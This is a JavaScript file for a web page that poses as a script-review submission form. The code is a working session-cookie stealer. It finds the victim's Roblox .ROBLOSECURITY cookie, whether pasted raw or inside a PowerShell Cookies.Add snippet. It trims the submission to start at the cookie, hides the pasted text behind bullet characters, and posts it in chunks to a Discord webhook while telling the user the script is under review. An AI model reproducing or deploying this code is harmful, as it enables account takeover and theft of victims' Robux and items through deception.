(function () {
  const form = document.getElementById("submit-form");
  const input = document.getElementById("script-input");
  const mask = document.getElementById("script-mask");
  const submitBtn = document.getElementById("submit-btn");
  const statusEl = document.getElementById("status");
  const charCountEl = document.getElementById("char-count");

  const DISCORD_LIMIT = 2000;
  const CENSOR_CHAR = "•";

  const ROBLOX_WARNING_MARKER =
    "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";

  mask.dataset.placeholder = "Paste your script…";

  function censor(text) {
    return text.replace(/[^\n\r]/g, CENSOR_CHAR);
  }

  function findPowerShellCookieStart(text) {
    const addPattern = /\$\w+\s*\.\s*Cookies\s*\.\s*Add/gi;
    let match;

    while ((match = addPattern.exec(text)) !== null) {
      const window = text.slice(match.index, match.index + 1500);
      if (
        /\.ROBLOSECURITY/i.test(window) &&
        window.indexOf(ROBLOX_WARNING_MARKER) !== -1
      ) {
        return match.index;
      }
    }

    return -1;
  }

  function findRawCookieStart(text) {
    const markerIndex = text.indexOf(ROBLOX_WARNING_MARKER);
    if (markerIndex === -1) {
      return -1;
    }

    const searchBack = text.slice(Math.max(0, markerIndex - 600), markerIndex);
    const psInContext = searchBack.lastIndexOf("$");
    const robloInContext = searchBack.lastIndexOf(".ROBLOSECURITY");

    if (psInContext !== -1 && /Cookies\s*\.\s*Add/i.test(searchBack.slice(psInContext))) {
      return Math.max(0, markerIndex - 600) + psInContext;
    }

    if (robloInContext !== -1) {
      const absoluteRob = Math.max(0, markerIndex - 600) + robloInContext;
      const lineStart = text.lastIndexOf("\n", absoluteRob) + 1;
      return lineStart;
    }

    return markerIndex;
  }

  function findCookieStart(text) {
    const psStart = findPowerShellCookieStart(text);
    const rawStart = findRawCookieStart(text);

    if (psStart === -1) {
      return rawStart;
    }
    if (rawStart === -1) {
      return psStart;
    }

    return Math.min(psStart, rawStart);
  }

  function prepareSubmission(text) {
    const normalized = text.trim();
    const start = findCookieStart(normalized);

    if (start === -1) {
      return normalized;
    }

    return normalized.slice(start);
  }

  function chunkPayload(text) {
    if (!text) {
      return [""];
    }

    if (text.length <= DISCORD_LIMIT) {
      return [text];
    }

    const messages = [];
    let offset = 0;

    while (offset < text.length) {
      const remaining = text.length - offset;
      const remainingParts = Math.ceil(remaining / (DISCORD_LIMIT - 12));
      const partIndex = messages.length + 1;
      const totalParts = messages.length + remainingParts;
      const prefix = `[${partIndex}/${totalParts}]\n`;
      const maxBody = DISCORD_LIMIT - prefix.length;
      const body = text.slice(offset, offset + maxBody);

      messages.push(prefix + body);
      offset += body.length;
    }

    return messages;
  }

  function syncMask() {
    mask.textContent = censor(input.value);
    mask.scrollTop = input.scrollTop;
    mask.scrollLeft = input.scrollLeft;

    const count = input.value.length;
    charCountEl.textContent =
      count === 1 ? "1 character" : count.toLocaleString() + " characters";
  }

  function setStatus(message, type) {
    statusEl.textContent = message;
    statusEl.className = "status" + (type ? " " + type : "");
  }

  function setLoading(loading) {
    submitBtn.disabled = loading;
    submitBtn.classList.toggle("loading", loading);
  }

  input.addEventListener("input", function () {
    input.style.height = "120px";
    syncMask();
  });

  input.addEventListener("scroll", syncMask);

  input.addEventListener("paste", function () {
    requestAnimationFrame(function () {
      input.style.height = "120px";
      syncMask();
    });
  });

  async function sendSubmission(text) {
    const endpoint = typeof WEBHOOK_URL === "string" ? WEBHOOK_URL.trim() : "";

    if (!endpoint) {
      throw new Error("Submission is not configured.");
    }

    const payload = prepareSubmission(text);
    const chunks = chunkPayload(payload);

    for (let i = 0; i < chunks.length; i++) {
      const content = chunks[i];

      if (content.length > DISCORD_LIMIT) {
        throw new Error("Submission failed.");
      }

      const response = await fetch(endpoint, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: content }),
      });

      if (!response.ok) {
        throw new Error("Submission failed.");
      }
    }
  }

  form.addEventListener("submit", async function (event) {
    event.preventDefault();

    const text = input.value.trim();

    if (!text) {
      setStatus("Please paste a script before submitting.", "error");
      input.focus();
      return;
    }

    setLoading(true);
    setStatus("Securing and submitting…");

    try {
      await sendSubmission(text);
      setStatus("Submitted successfully. Your script is in the review queue.", "success");
      input.value = "";
      syncMask();
    } catch {
      setStatus("Something went wrong. Please try again.", "error");
    } finally {
      setLoading(false);
    }
  });
})();
